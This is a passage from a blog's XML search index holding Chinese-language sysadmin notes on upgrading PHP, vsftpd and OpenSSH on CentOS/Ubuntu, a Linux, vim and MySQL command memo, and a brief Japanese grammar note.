          <category> 运维 </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP upgrade, from 5.5.* to 7.2.*</title>
      <link href="//p/2019/PHP_upgrade_from_5.5.*_to_7.2.24/"/>
      <url>//p/2019/PHP_upgrade_from_5.5.*_to_7.2.24/</url>
      
        <content type="html"><![CDATA[<h3 id="服务器版本-CentOS6"><a href="#服务器版本-CentOS6" class="headerlink" title="服务器版本 CentOS6"></a>服务器版本 CentOS6</h3><h3 id="备份-快照"><a href="#备份-快照" class="headerlink" title="备份(快照)"></a>备份(快照)</h3><h3 id="首先卸载当前版本PHP"><a href="#首先卸载当前版本PHP" class="headerlink" title="首先卸载当前版本PHP"></a>首先卸载当前版本PHP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum remove php*</span><br></pre></td></tr></table></figure><h3 id="配置yum仓库"><a href="#配置yum仓库" class="headerlink" title="配置yum仓库"></a>配置yum仓库</h3><p>在CentOS6/7升级PHP至7.* 需要开启Remi和EPEL仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line"></span><br><span class="line">rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm</span><br></pre></td></tr></table></figure><h3 id="安装PHP7-2"><a href="#安装PHP7-2" class="headerlink" title="安装PHP7.2"></a>安装PHP7.2</h3><p>需要在yum中指定需要使用的相关仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php</span><br></pre></td></tr></table></figure><p>安装完成后检查 PHP 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br></pre></td></tr></table></figure><h3 id="安装相关-PHP-模块"><a href="#安装相关-PHP-模块" class="headerlink" title="安装相关 PHP 模块"></a>安装相关 PHP 模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php-xml php-soap php-xmlrpc php-mbstring php-json php-gd php-mcrypt php-fpm</span><br></pre></td></tr></table></figure><p>这里有个小坑,我在安装php-gd的时候会弹出一下错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error: Package: gd-last-2.2.5-5.el6.remi.x86_64 (remi-safe)</span><br><span class="line">           Requires: libwebp.so.5()(64bit)</span><br><span class="line"> You could try using --skip-broken to work around the problem</span><br></pre></td></tr></table></figure><p>谷歌libwebp.so.5()(64bit)这个依赖项后发现以下两个链接</p><p><a href="https://pkgs.org/download/libwebp.so.5()(64bit)">https://pkgs.org/download/libwebp.so.5()(64bit)</a><br><a href="https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html">https://centos.pkgs.org/6/atomic-x86_64/libwebp-0.4.3-3.el6.art.x86_64.rpm.html</a></p><p>于是顺势找到rpm包链接</p><p><a href="http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm">http://www6.atomicorp.com/channels/atomic/centos/6/x86_64/RPMS/libwebp-0.4.3-3.el6.art.x86_64.rpm</a></p><p>安装它就好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -i it</span><br></pre></td></tr></table></figure><p>接下来就可以启动php-fpm并设置为开机启动啦!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service php-fpm start</span><br><span class="line"></span><br><span class="line">chkconfig php-fpm on</span><br></pre></td></tr></table></figure><p>如果需要,也把mysql服务装上,顺便启用它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=remi-php72 install php-mysql</span><br><span class="line"></span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>「形容詞」</title>
      <link href="//p/2019/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/"/>
      <url>//p/2019/%E3%80%8C%E5%BD%A2%E5%AE%B9%E8%A9%9E%E3%80%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="「な形容詞」"><a href="#「な形容詞」" class="headerlink" title="「な形容詞」"></a>「な形容詞」</h3><ul><li><strong>「な形容詞」+ な　+ 名词 ，因此称为「な形容詞」</strong><br>&nbsp; 名词 + の + 名词</li></ul><p>にぎやか：热闹的</p><h3 id="「い形容詞」特徴：〜い"><a href="#「い形容詞」特徴：〜い" class="headerlink" title="「い形容詞」特徴：〜い"></a>「い形容詞」特徴：〜い</h3><ul><li>い形容詞 + 名词<br>例：大きい会社</li></ul><table><thead><tr><th align="center">肯定行</th><th align="center">否定行</th></tr></thead><tbody><tr><td align="center">〜います</td><td align="center">〜 **<del>い</del>**くないです</td></tr><tr><td align="center">寒いです</td><td align="center">寒くないです</td></tr></tbody></table><p>辛い　暖かい　暑い　（食べ）たいです</p>]]></content>
      
      
      <categories>
          
          <category> 勉強 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勉強 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsftpd upgrade, from 2.2.2 to 3.0.3</title>
      <link href="//p/2019/vsftpd_upgrade_from_2.2.2_to_3.0.3/"/>
      <url>//p/2019/vsftpd_upgrade_from_2.2.2_to_3.0.3/</url>
      
        <content type="html"><![CDATA[<h3 id="记一次vsftpd-升级过程"><a href="#记一次vsftpd-升级过程" class="headerlink" title="记一次vsftpd 升级过程"></a>记一次vsftpd 升级过程</h3><h3 id="备份-快照"><a href="#备份-快照" class="headerlink" title="备份(快照)"></a>备份(快照)</h3><h3 id="收集系统信息以及原有vsftpd安装版本信息"><a href="#收集系统信息以及原有vsftpd安装版本信息" class="headerlink" title="收集系统信息以及原有vsftpd安装版本信息"></a>收集系统信息以及原有vsftpd安装版本信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">rpm -qa | grep vsftpd</span><br><span class="line">vsftpd -v</span><br></pre></td></tr></table></figure><h3 id="卸载原-vsftpd"><a href="#卸载原-vsftpd" class="headerlink" title="卸载原 vsftpd"></a>卸载原 vsftpd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -e vsftpd-******</span><br></pre></td></tr></table></figure><h3 id="GPG签名认证"><a href="#GPG签名认证" class="headerlink" title="GPG签名认证"></a>GPG签名认证</h3><p>由于没用到公钥,因此跳过下面两条命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg -import publickey</span><br><span class="line">gpg -verify ***.asc(.sig) ***</span><br></pre></td></tr></table></figure><h3 id="解压后进行库文件相关设置"><a href="#解压后进行库文件相关设置" class="headerlink" title="解压后进行库文件相关设置"></a>解压后进行库文件相关设置</h3><p>安装之前,如果系统为64位，需要更改vsf_findlibs.sh文件库中lib 路径改为lib64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/lib\//lib64\//g&#x27;</span> vsf_findlibs.sh</span><br></pre></td></tr></table></figure><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>由于没有相关依赖,因此不用进行预编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="配置信息修改"><a href="#配置信息修改" class="headerlink" title="配置信息修改"></a>配置信息修改</h3><p>因为是升级安装，需要保留原来vsftp的相关配置，接下来需要复制些文件到相应<br>vsftp目录。具体操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp vsftpd.conf /etc                   <span class="comment">#配置主文件     </span></span><br><span class="line">cp RedHat/vsftpd.pam /etc/pam.d/ftp   <span class="comment">#PAM 认证文件</span></span><br></pre></td></tr></table></figure><p>如果系统为64位，请将/etc/pam.d/ftp /lib目录替换为/lib64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/lib\//lib64\//g&#x27;</span> /etc/pam.d/ftp</span><br></pre></td></tr></table></figure><p>将以下内容写入 /etc/vsftpd.conf</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">anonymous_enable=NO</span><br><span class="line">local_enable=yes</span><br><span class="line">write_enable=YES</span><br></pre></td></tr></table></figure><h3 id="启动-vsftpd-进行测试"><a href="#启动-vsftpd-进行测试" class="headerlink" title="启动 vsftpd 进行测试"></a>启动 vsftpd 进行测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd /etc/vsftpd.conf &amp;</span><br></pre></td></tr></table></figure><h3 id="把-vsftpd-加入到开机启动项中"><a href="#把-vsftpd-加入到开机启动项中" class="headerlink" title="把 vsftpd 加入到开机启动项中"></a>把 vsftpd 加入到开机启动项中</h3><p>将以下内容写入 /etc/rc.d/rc.local_enable</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd /etc/vsftpd.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><h3 id="修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建"><a href="#修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建" class="headerlink" title="修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建"></a>修改配置文件如下选项，如果没有相关选项和目录需手动添加或创建</h3><p>创建 /usr/share/empty 文件夹并将以下内容写入 /etc/vsftpd.conf</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_chroot_dir=/usr/share/<span class="built_in">empty</span></span><br></pre></td></tr></table></figure><p>注意：如重启后不能启动服务修改 /etc/xinetd.d/vsftpd 文件，把 disable=no 改成 disable=yes 就行了</p><h3 id="版本验证"><a href="#版本验证" class="headerlink" title="版本验证"></a>版本验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd -v</span><br></pre></td></tr></table></figure><h4 id="参考自-https-blog-csdn-net-dbdeep-article-details-63037691"><a href="#参考自-https-blog-csdn-net-dbdeep-article-details-63037691" class="headerlink" title="参考自: https://blog.csdn.net/dbdeep/article/details/63037691"></a>参考自: <a href="https://blog.csdn.net/dbdeep/article/details/63037691">https://blog.csdn.net/dbdeep/article/details/63037691</a></h4>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> vsftpd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openssh upgrade, from 7.5 to 8.0p1</title>
      <link href="//p/2019/Openssh_upgrade_from_7.5_to_8.0p1/"/>
      <url>//p/2019/Openssh_upgrade_from_7.5_to_8.0p1/</url>
      
        <content type="html"><![CDATA[<h3 id="记一次OpenSSH升级过程"><a href="#记一次OpenSSH升级过程" class="headerlink" title="记一次OpenSSH升级过程"></a>记一次OpenSSH升级过程</h3><h3 id="系统环境-Ubuntu14-04"><a href="#系统环境-Ubuntu14-04" class="headerlink" title="系统环境: Ubuntu14.04"></a>系统环境: Ubuntu14.04</h3><h3 id="sshd-D"><a href="#sshd-D" class="headerlink" title="sshd -D"></a>sshd -D</h3><p>先是修改sshd配置允许root登录，但是重启不了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service ssh restart </span><br></pre></td></tr></table></figure><p>查看得知存在 sshd -D 进程并终止它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep ssh</span><br><span class="line">sudo <span class="built_in">kill</span> ID</span><br></pre></td></tr></table></figure><p>最后开启sshd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/sshd -D</span><br></pre></td></tr></table></figure><p>启动后就可以root登录了<br>emmm…. 好像启动后只能登录一次?<br>那请试试:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/sshd -t</span><br></pre></td></tr></table></figure><p>好奇的我想知道-D是什么意思…<br>但看了说明也不知道为什么系列。。<br>-D When this option is specified, sshd will not detach and does not become a daemon.  This allows easy monitoring of sshd.</p><p>会不会和这有关呢? (摘自官网)<br>OpenSSH runs as two processes when connecting to other computers. The first process is a privileged process and controls the issuance of privileges as necessary. The second process communicates with the network.</p><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>别忘了备份、别忘了备份、别忘了备份…</p><h3 id="卸载原本OpenSSH"><a href="#卸载原本OpenSSH" class="headerlink" title="卸载原本OpenSSH"></a>卸载原本OpenSSH</h3><p>由于我原本是编译安装的，到原本编译安装的目录卸载就可以了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make uninstall</span><br></pre></td></tr></table></figure><h3 id="下载OpenSSH"><a href="#下载OpenSSH" class="headerlink" title="下载OpenSSH"></a>下载OpenSSH</h3><p>到官网下载就可以了<br><a href="http://www.openssh.com/releasenotes.html">http://www.openssh.com/releasenotes.html</a></p><h3 id="SHA1值检验"><a href="#SHA1值检验" class="headerlink" title="SHA1值检验"></a>SHA1值检验</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1sum openssh-8.0p1.tar.gz</span><br></pre></td></tr></table></figure><h3 id="相关依赖包"><a href="#相关依赖包" class="headerlink" title="相关依赖包"></a>相关依赖包</h3><p>pam pam-devel zlib zlib-devel openssl-devel</p><h5 id="注意下ubuntu下pam是-libpam0g、pam-devel-是-libpam0g-dev"><a href="#注意下ubuntu下pam是-libpam0g、pam-devel-是-libpam0g-dev" class="headerlink" title="注意下ubuntu下pam是 libpam0g、pam-devel 是 libpam0g-dev"></a>注意下ubuntu下pam是 libpam0g、pam-devel 是 libpam0g-dev</h5><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords --with-pam --with-zlib --with-ssl-dir=/usr/<span class="built_in">local</span>/ssl --with-privsep-path=/var/lib/sshd</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h3 id="重启服务器，搞定！"><a href="#重启服务器，搞定！" class="headerlink" title="重启服务器，搞定！"></a>重启服务器，搞定！</h3>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> SSH </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>memo</title>
      <link href="//p/2019/memo/"/>
      <url>//p/2019/memo/</url>
      
        <content type="html"><![CDATA[<h3 id="记录-linux-一些常见问题"><a href="#记录-linux-一些常见问题" class="headerlink" title="记录 linux 一些常见问题"></a>记录 linux 一些常见问题</h3><h4 id="一、某端口是否被-Linux-防火墙阻止"><a href="#一、某端口是否被-Linux-防火墙阻止" class="headerlink" title="一、某端口是否被 Linux 防火墙阻止"></a>一、某端口是否被 Linux 防火墙阻止</h4><p>-L: 查看管理命令<br>子命令:<br>&emsp;-n：以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。<br>&emsp;-v：显示详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -vnL | grep <span class="string">&#x27;:port&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="二、-字符对上一个命令的文本替换并重新执行命令"><a href="#二、-字符对上一个命令的文本替换并重新执行命令" class="headerlink" title="二、^字符对上一个命令的文本替换并重新执行命令"></a>二、^字符对上一个命令的文本替换并重新执行命令</h4><p>^before^after^</p><h4 id="三、vim系列"><a href="#三、vim系列" class="headerlink" title="三、vim系列"></a>三、vim系列</h4><ul><li><p>vim 字符串替换</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">:s/well/good/替换当前行第一个well 为 good</span><br><span class="line"></span><br><span class="line">:s/well/good/g        替换当前行所有well 为 good</span><br><span class="line"></span><br><span class="line">:n,$s/well/good/     替换第 n 行开始到最后一行中每一行的第一个 well 为 good</span><br><span class="line"></span><br><span class="line">:n,$s/well/good/g     替换第 n 行开始到最后一行中每一行所有 well 为 good</span><br><span class="line"></span><br><span class="line">n 为数字，若 n 为 .，表示从当前行开始到最后一行</span><br><span class="line"></span><br><span class="line">:%s/well/good/      （等同于 :g/well/s//good/） 替换每一行的第一个 well 为 good</span><br><span class="line"></span><br><span class="line">:%s/well/good/g    （等同于 :g/well/s//good/g） 替换每一行中所有 well 为 good</span><br><span class="line"></span><br><span class="line">特殊符号转义：可以使用#作为分隔符，此时中间出现的 / 不会作为分隔符</span><br><span class="line"></span><br><span class="line">:s#well/#good/#     　　　替换当前行第一个 well/ 为 good/</span><br><span class="line"></span><br><span class="line">:%s#/usr/bin#/bin#g 可以把文件中所有路径/usr/bin换成/bin</span><br></pre></td></tr></table></figure></li><li><p>vim 乱码问题<br>其中-b一般是用来查看对应的二进制文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> -<span class="keyword">b</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure></li><li><p>vim tab 设置为4个空格<br>vimrc文件末尾加上</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">ts</span>=<span class="number">4</span></span><br><span class="line"><span class="keyword">set</span> expandtab</span><br><span class="line"><span class="keyword">set</span> autoindent</span><br></pre></td></tr></table></figure><ul><li><p>vim 多行注释</p><ul><li>首先按 esc 进入命令行模式下，按下 Ctrl + v，进入列（也叫区块）模式;</li><li>在行首使用上下键选择需要注释的多行;</li><li>按下键盘（大写）“I” 键，进入插入模式；</li><li>然后输入注释符（“//”、“#”等）;</li><li>最后按下 “Esc” 键。 注：在按下esc键后，会稍等一会才会出现注释，不要着急时间很短的~</li></ul></li><li><p>vim 去掉高亮底色<br>进入命令模式, 输入</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:nohl</span><br></pre></td></tr></table></figure></li><li><p>vim 除了 i o 外的其他插入</p><ul><li>I 在光标当前行开始插入</li><li>a 在光标后插入</li><li>A 在光标当前行末尾插入</li><li>O 在光标当前行的上一行插入新行</li></ul></li><li><p>vim 定位命令</p><ul><li>:set nu 显示行号</li><li>:set nonu 取消行号</li></ul></li><li><p>vim 替换和取消命令</p><ul><li>r 替换光标所在处的字符</li><li>R 从光标所在处开始替换,按Esc键结束</li></ul></li><li><p>vim 删除命令(一直傻傻的按远远的del键..)</p><ul><li>x 删除光标所在处命令</li><li>nx 删除光标所在处后的n个字符</li><li>dG 删除光标所在行到末尾行的所有内容</li><li>D 删除光标所在处到行尾的内容</li><li>:n,md 删除制定范围的行</li></ul></li><li><p>vim 常用快捷键</p><ul><li>Shift + zz 保存退出, 与 “:wq” 作用相同</li><li>V 进入行可视模式</li><li>Ctrl + v 进入块可视模式</li></ul></li><li><p>vim 鼠标右键不能复制粘贴，而是切为可视化模式</p><ul><li>全局改变 vim /etc/vimrc</li><li>仅改变当前用户 vim ~/.vimrc </li><li>注意事项: source 这一行的功能是加载默认配置，一定要先确定该文件路径存在 (根据vim版本确实vim7*,8*)，否则可能会导致 vim 不可用<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /usr/share/vim/vim81/defaults.vim</span><br><span class="line"><span class="built_in">let</span> skip_defaults_vim = 1</span><br><span class="line"><span class="keyword">if</span> has(<span class="string">&#x27;mouse&#x27;</span>)</span><br><span class="line">    <span class="built_in">set</span> mouse-=a</span><br><span class="line">endif</span><br></pre></td></tr></table></figure></li><li>重新打开 vim 就可以正常使用鼠标右键复制粘贴了</li><li>转载自: <a href="https://xirikm.net/2019/504-1.html">https://xirikm.net/2019/504-1.html</a></li></ul></li></ul><h4 id="八、linux终端锁屏与解锁"><a href="#八、linux终端锁屏与解锁" class="headerlink" title="八、linux终端锁屏与解锁"></a>八、linux终端锁屏与解锁</h4><p>ctrl+s 锁屏<br>ctrl+q 解锁</p><h4 id="九、Sublime-Text-3-垂直选取"><a href="#九、Sublime-Text-3-垂直选取" class="headerlink" title="九、Sublime Text 3 垂直选取"></a>九、Sublime Text 3 垂直选取</h4><p>Shift+鼠标右键</p><h4 id="十、MySQL统计所以库数据大小（有点慢喔）"><a href="#十、MySQL统计所以库数据大小（有点慢喔）" class="headerlink" title="十、MySQL统计所以库数据大小（有点慢喔）"></a>十、MySQL统计所以库数据大小（有点慢喔）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, concat(TRUNCATE(sum(data_length)/1024/1024,2),<span class="string">&#x27;MB&#x27;</span>) AS data_size,</span><br><span class="line">concat(TRUNCATE(sum(index_length)/1024/1024,2),<span class="string">&#x27;MB&#x27;</span>) AS index_size</span><br><span class="line">FROM information_schema.TABLES</span><br><span class="line">GROUP BY TABLE_SCHEMA</span><br><span class="line">ORDER BY data_length DESC;</span><br></pre></td></tr></table></figure><h4 id="十一、用户加组"><a href="#十一、用户加组" class="headerlink" title="十一、用户加组"></a>十一、用户加组</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -aG group user</span><br></pre></td></tr></table></figure><h4 id="十二、探测服务是否已经启动-运行是否正常"><a href="#十二、探测服务是否已经启动-运行是否正常" class="headerlink" title="十二、探测服务是否已经启动, 运行是否正常"></a>十二、探测服务是否已经启动, 运行是否正常</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall -0 service</span><br></pre></td></tr></table></figure><h4 id="十三、deb-和-rpm-包之间的转换"><a href="#十三、deb-和-rpm-包之间的转换" class="headerlink" title="十三、deb 和 rpm 包之间的转换"></a>十三、deb 和 rpm 包之间的转换</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install alien</span><br></pre></td></tr></table></figure><h4 id="十四、查看自己的-pts"><a href="#十四、查看自己的-pts" class="headerlink" title="十四、查看自己的 pts"></a>十四、查看自己的 pts</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">who am i</span><br></pre></td></tr></table></figure><h4 id="十五、创建目录结构"><a href="#十五、创建目录结构" class="headerlink" title="十五、创建目录结构"></a>十五、创建目录结构</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -v 显示做了什么</span></span><br><span class="line">mkdir -pv path/&#123;dir1, dir2, ...&#125;</span><br></pre></td></tr></table></figure><h4 id="十六、查看-nginx-的组和用户并锁定其不能用-ssh-登录"><a href="#十六、查看-nginx-的组和用户并锁定其不能用-ssh-登录" class="headerlink" title="十六、查看 nginx 的组和用户并锁定其不能用 ssh 登录"></a>十六、查看 nginx 的组和用户并锁定其不能用 ssh 登录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看组</span></span><br><span class="line">getent group nginx</span><br><span class="line"><span class="comment"># 查看用户</span></span><br><span class="line">getent passwd nginx</span><br><span class="line"><span class="comment"># 查看nginx属于哪个组</span></span><br><span class="line">id nginx</span><br><span class="line"><span class="comment"># 锁定 nginx 不能登录</span></span><br><span class="line">usermod -s /sbin/nologin nginx</span><br></pre></td></tr></table></figure><h4 id="十七、锁定nginx用户不能登录"><a href="#十七、锁定nginx用户不能登录" class="headerlink" title="十七、锁定nginx用户不能登录"></a>十七、锁定nginx用户不能登录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l </span><br></pre></td></tr></table></figure><h4 id="十八、mysql密码强度设置"><a href="#十八、mysql密码强度设置" class="headerlink" title="十八、mysql密码强度设置"></a>十八、mysql密码强度设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password_policy=0;</span><br><span class="line">mysql&gt; <span class="built_in">set</span> global validate_password_length=1;</span><br><span class="line"><span class="comment"># 设置 root&#x27;@&#x27;localhost 的密码</span></span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;new password&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="十九、MySQL查看所有连接的客户端ip"><a href="#十九、MySQL查看所有连接的客户端ip" class="headerlink" title="十九、MySQL查看所有连接的客户端ip"></a>十九、MySQL查看所有连接的客户端ip</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SELECT user, host from mysql.user;</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">SELECT</span><br><span class="line">substring_index(HOST, <span class="string">&#x27;:&#x27;</span>, 1) AS host_name,</span><br><span class="line">state,</span><br><span class="line">count(*)</span><br><span class="line">FROM</span><br><span class="line">information_schema. PROCESSLIST</span><br><span class="line">GROUP BY</span><br><span class="line">state,</span><br><span class="line">host_name;</span><br></pre></td></tr></table></figure><h4 id="二十、编码转换"><a href="#二十、编码转换" class="headerlink" title="二十、编码转换"></a>二十、编码转换</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 linux 下打开 windows 的 txt 可能乱码</span></span><br><span class="line">iconv -f GBK -t UTF-8 文件名字</span><br><span class="line"><span class="comment"># gedit 乱码可尝试</span></span><br><span class="line">gsettings <span class="built_in">set</span> org.gnome.gedit.preferences.encodings candidate-encodings <span class="string">&quot;[&#x27;GB18030&#x27;, &#x27;UTF-8&#x27;, &#x27;CURRENT&#x27;, &#x27;ISO-8859-15&#x27;, &#x27;UTF-16&#x27;]&quot;</span></span><br></pre></td></tr></table></figure><h4 id="二十一、批量图片大小转换"><a href="#二十一、批量图片大小转换" class="headerlink" title="二十一、批量图片大小转换"></a>二十一、批量图片大小转换</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name <span 